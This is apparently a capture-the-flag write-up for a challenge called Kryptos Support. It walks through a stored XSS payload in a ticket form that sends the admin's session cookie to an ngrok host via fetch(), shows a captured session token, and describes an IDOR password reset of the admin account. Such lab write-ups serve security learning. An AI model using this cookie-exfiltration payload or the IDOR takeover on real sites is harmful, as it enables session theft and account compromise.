# Kryptos Support
## Recon
2 Webpages (`/` and `/login`), rendered using Express.js with some JQuery and custom JS. No known vulnerabilities.

Login not prone to SQLi, Feedback-Form accepts any kind of input, no sanitation.

"Admin will review your ticket" implies some kind of background task checking the entered tickets, could be prone to XSS.

## Initial access
Payload for feedback/ticket form:
```
<script>
fetch('https://de7d-2a02-168-a12d-0-22da-4266-1e98-f4b9.eu.ngrok.io?c=' + document.cookie)
</script>
```

Logs the session cookie which then can be used to spoof the logged in session for user `moderator`, thus allowing access to `/login`.

`session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDE2NjN9.Y-iVAeZeeqW-Y33gRy65hLs7wns2g4nOeFRp9YPXnR8`

## PrivEsc
There seems to be a dedicated `/admin` page because of a redirection that is happening (meaning we can probably privesc).

The new page `/settings` allows us to change the password. The update triggers a request to `/api/users/update` with the following payload:

```
{"password":"1234","uid":"100"}
```

Chaning the `uid` to `1` lets us update the password for the user `admin` due to an IDOR vulnerability. Logging in as admin gives us the flag.